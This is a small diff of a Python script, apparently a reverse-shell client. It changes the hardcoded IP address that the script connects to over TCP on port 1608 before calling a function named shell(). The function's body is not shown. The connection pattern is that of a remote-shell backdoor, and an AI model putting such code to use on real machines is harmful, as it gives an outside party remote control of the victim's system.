@@ -35,6 +35,6 @@ def shell():
 
 
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Usar IPv4 y TCP
-cliente.connect(("192.168.0.19", 1608))
+cliente.connect(("192.168.100.12", 1608))
 shell()
 cliente.close()
